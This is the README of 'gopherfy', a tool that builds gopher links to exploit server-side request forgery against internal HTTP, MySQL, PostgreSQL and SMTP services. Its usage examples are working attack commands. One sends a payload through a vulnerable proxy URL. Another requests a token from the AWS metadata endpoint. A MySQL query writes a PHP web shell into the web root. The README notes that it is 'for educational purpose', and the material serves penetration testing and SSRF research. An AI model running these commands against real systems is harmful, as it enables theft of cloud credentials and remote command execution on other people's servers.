# gopherfy
![Build Status](https://github.com/hupe1980/gopherfy/workflows/build/badge.svg) 
[![Go Reference](https://pkg.go.dev/badge/github.com/hupe1980/gopherfy.svg)](https://pkg.go.dev/github.com/hupe1980/gopherfy)
> Tool to generate gopher links for exploiting SSRF

```
curl http://example.org/ssrf/vuln/proxy?url=$(gopherfy mysql -e url -q "show databases;")
```

:warning: This is for educational purpose. Don’t try it on live servers!

## How to use
```
Usage:
  gopherfy [command]

Available Commands:
  completion  Generate the autocompletion script for the specified shell
  help        Help about any command
  http        Generate http gopher link
  mysql       Generate mysql gopher link
  postgres    Generate postgres gopher link
  smtp        Generate smtp gopher link

Flags:
  -e, --encoder string   the encoder to use. allowed: "base64", "url" or "none" (default "none")
  -h, --help             help for gopherfy
  -v, --version          version for gopherfy

Use "gopherfy [command] --help" for more information about a command.
```

## HTTP
```
Generate http gopher link

Usage:
  gopherfy http [flags]

Examples:
gopherfy http -a 169.254.169.254:80 -p /latest/api/token -X PUT -H X-aws-ec2-metadata-token-ttl-seconds=21600

Flags:
  -a, --addr string             http address (default "127.0.0.1:80")
  -H, --header stringToString   http header value (key=value) (default [])
  -h, --help                    help for http
  -V, --http-version string     http protocol version (default "HTTP/1.0")
  -p, --path string             http path (default "/")
  -X, --request string          http request method (default "GET")
  -A, --user-agent string       http user agent (default "gopherfy")

Global Flags:
  -e, --encoder string   the encoder to use. allowed: "base64", "url" or "none" (default "none")
```

## MySQL
```
Generate mysql gopher link

Usage:
  gopherfy mysql [flags]

Examples:
gopherfy mysql -q "SELECT '<?php system(\$$_REQUEST[\'cmd\']); ?>' INTO OUTFILE '/var/www/html/shell.php'"

Flags:
  -a, --addr string    mysql address (default "127.0.0.1:3306")
  -d, --db string      mysql database name
  -h, --help           help for mysql
  -q, --query string   mysql query
  -u, --user string    mysql username (default "root")

Global Flags:
  -e, --encoder string   the encoder to use. allowed: "base64", "url" or "none" (default "none")
```

## PostgreSQL
```
Generate postgres gopher link

Usage:
  gopherfy postgres [flags]

Flags:
  -a, --addr string    postgres address (default "127.0.0.1:5432")
  -d, --db string      postgres database name
  -h, --help           help for postgres
  -q, --query string   postgres query
  -u, --user string    postgres username (default "postgres")

Global Flags:
  -e, --encoder string   the encoder to use. allowed: "base64", "url" or "none" (default "none")
```
## License
[MIT](LICENCE)
